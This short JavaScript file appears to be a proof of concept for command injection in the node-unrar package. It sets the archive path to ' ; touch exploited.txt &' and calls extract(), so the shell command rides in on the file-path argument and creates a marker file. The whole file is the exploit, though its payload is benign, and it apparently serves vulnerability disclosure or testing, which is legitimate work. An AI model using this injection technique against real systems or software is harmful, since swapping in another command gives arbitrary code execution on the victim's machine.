
const pkg = require('node-unrar');

const path = " ; touch exploited.txt &";

const options = {
    path: path
};

const i = new pkg(options);

i.extract()

console.log(pkg);